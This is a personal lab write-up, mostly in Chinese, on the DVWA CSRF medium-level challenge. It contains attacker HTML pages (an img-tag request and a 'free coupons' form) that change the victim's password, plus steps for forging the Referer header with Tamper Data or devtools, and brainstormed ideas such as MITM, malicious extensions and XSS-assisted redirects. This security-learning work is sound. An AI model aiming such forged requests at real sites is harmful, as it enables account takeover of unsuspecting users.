# Cross Site Request Forgery (CSRF)

> Medium Level
For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain, it must of come from the web application so it can be trusted.
It may be required to link in multiple vulnerabilities to exploit this vector, such as reflective XSS.

看提示有寫說後端會判斷 request 是否來自同一個網域，代表我必須在 DVWA 以外的網域建立一個惡意頁面模擬攻擊場景

現在瀏覽器也有 CORS 限制，也就是禁止不同網域的請求，因此要克服這兩個因素

跨來源資源共用（CORS） - HTTP | MDN
[https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS)

要繞過 CORS 和 request 來源檢查我大概會參考到至少這兩個條件:

1. 將 request 轉為後端傳送，這樣就可以突破瀏覽器的 CORS 限制 (但前提是你需要有對方的 cookie 或 csrf token)
2. 更改 request header 裡的 `Referer` 欄位以偽照來源

但是不同域名的話就無法取得 user 的 cookie 內的 PHPSESSIONID 🤔，不知道有沒解法 ?

## Test trigger CSRF attack from other domain

### By GET img tag

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>csrf by GET</title>
</head>
<body>
set password to: 1111
<img src="http://localhost:8086/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change">
<script>
  console.log(`your cookie is: ${document.cookie}`)
</script>
</body>
</html>
```
先建立一個測試用的 server，用來放惡意攻擊頁面

惡意頁面網址:

```
http://192.168.0.196:8080/get-img.html
```

瀏覽器會將 DVWA 的網址 http://localhost:8086/vulnerabilities/csrf/ 和惡頁面的網址視為不同域名

### 假裝是受害者被騙連到惡意網頁

![假裝是受害者被騙連到惡意網頁](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/630b70ea-e67c-4c69-95c4-27e344b54cf1/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T035944Z&X-Amz-Expires=86400&X-Amz-Signature=955a6e04aab80743535c1d6832bfb43a1c9890caecd5687015623c89d56627e5&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

![假裝是受害者被騙連到惡意網頁](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f98de600-4844-4322-9e72-f7a4b79eb39f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T040004Z&X-Amz-Expires=86400&X-Amz-Signature=891412560875d25c96a1e88d1b3607cb05ca6f1f3286ff62d9c71f894c9bbb08&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)



### failed

![failed](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/116efe83-b65d-40f8-b247-db202fcd8eb5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T040058Z&X-Amz-Expires=86400&X-Amz-Signature=454d5731f61897edb5d6eff1457ed3715c5a0ed4e63e1fa7a17d1c0e11b1ab73&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

看來沒有效，失敗 😭，get img tag 的方式沒辦法用於不同域名的場景

---
### By GET Form

這邊是參考別人的 writeup，做一個 GET form 從惡意頁面跳轉到目標網域的頁面

為了方便觀察就不隱藏表單了

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>csrf by POST</title>
  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
</head>
<body>
set password to: 1111

<form action="http://localhost:8086/vulnerabilities/csrf/" method="get">
  <input type="xhidden" name="password_new" value="1111"/>
  <input type="xhidden" name="password_conf" value="1111"/>
  <input type="hidden" name="Change" value="Change"/>
  <input type="submit" value="Get free coupons 💸💸💸"/>
</form>
</body>
</html>
```
塞一個 form 給受害者點下去跳轉，理論上應該是可以，但實在是太可疑了XD，會讓人起疑心 除非能夠在瞬間又跳轉到其他頁面，目前想到的可能的場景是分享,重設密碼,串這跳轉這類功面能性頁，這類功能通常是一瞬間就被重導走，而且帶有參數可以讓你指定接下來要跳轉到哪邊去

另一種場竟是我已經拿下 DVWA 網域的某個頁面，再讓受害者跳轉到這個 CSRF 頁面

![That request didn't look correct.](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b7a07cdb-ac3b-4044-916e-7afb3ecc3136/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T040207Z&X-Amz-Expires=86400&X-Amz-Signature=bf76732e0fc0d3fc22214d2d5032a28bb19612965faaa2ddd7385b167f72f27c&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```html
That request didn't look correct.
```
### Intercept and change Referer value (Tamper Data)

想辦法讓 header 變成跟 DVWA 的一樣，要做到這件事必須從中攔截再修改

可以使用 Tamper Data 或 Burp Suite

Tamper Data for FF Quantum – 下載 🦊 Firefox 擴充套件（zh-TW）
[https://addons.mozilla.org/zh-TW/firefox/addon/tamper-data-for-ff-quantum/](https://addons.mozilla.org/zh-TW/firefox/addon/tamper-data-for-ff-quantum/)

```
Referer http://localhost:8086/vulnerabilities/csrf/
```

進入惡意頁面，按下送出
![tamper data](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b443baeb-2271-4740-a2a1-d4dc91ebfcb2/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T042909Z&X-Amz-Expires=86400&X-Amz-Signature=b739b0c296058934c70baa36083ad5a60834826f25c361712540ad2e03b40ff2&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

![tamper data](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/073b8349-3065-4c67-bc95-be0f1b5766e8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043047Z&X-Amz-Expires=86400&X-Amz-Signature=1b5d13c018618efa63b9e882681f2c153331fd0e01b166de83cfe8c324c609a7&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

Before
![before](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/9805fb6d-c1aa-45e6-92d9-1e0f1ffab0b2/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043129Z&X-Amz-Expires=86400&X-Amz-Signature=05f02453502fe2c30030cf8c52d5adc52d88725885f62cd5a23ffcc14d980abc&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

After
![after](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2f621a8d-c2ce-4644-8b0c-a4196e319e08/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043150Z&X-Amz-Expires=86400&X-Amz-Signature=8a9e0410a8b49b52995111f5fc24d0868bce8cf9306b0388812409699325f548&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Done
![done](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d7d4cba8-ace3-4196-8ff6-26bd1fdaaa8e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043241Z&X-Amz-Expires=86400&X-Amz-Signature=8816c29b3c2ccc0c2cb00cd0fd52306e06ba17f5d4593d19ea5235ead428cb37&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

---

### 夠過用 Network panel 修改
接下來所做的操作跟之前使用 tamper data 的流程差不多，只是工具不同

如果有在 Network 設定開啟 log 紀錄保存 (Persist Logs) 的話就可以看到跳轉後的 request，接著再回到惡意頁面修改 Referer

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ff68ec45-3783-469d-9738-5b85a5306a60/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043642Z&X-Amz-Expires=86400&X-Amz-Signature=42e39ee3f3f43b2d00e5d3971eb147c62c6789801014a0a65a1e1b7a803d8d8e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/1018f2c6-3b16-4d66-84e5-7431140aaf78/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043716Z&X-Amz-Expires=86400&X-Amz-Signature=7b849c91ad9ea168a1d0fbdb163113c3f5e600892a57557875363878306a9b14&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4fbf987c-624b-4db2-9ed7-75667d4ab672/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T043725Z&X-Amz-Expires=86400&X-Amz-Signature=a086b6e7d76a207395be244386fc8f2b29f47f102fab47fd0c63c724fc655ce4&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

---

### memo:

一些心得和未經過驗證的想法，先記錄一下

若要做到自動串改的話，也許可以從這些地方下手

- 惡意瀏覽器套件
- MITM
- 濫用目標網站的跳轉功能 (可能可以搭配 XSS)
- 對付 Referer 用竄改，對付 token 用擷取

如果從目標網站再進行間接跳轉不知道可不可行 ? 也就是最後會重導回惡意頁面，避免被察覺😶‍🌫️

```html
惡意頁面 -> DVWA page A (XSS) -> 惡意頁面
```

但在這之前要先確認 DVWA page A 上是否有能夠有 XSS 的地方或能濫用的功能
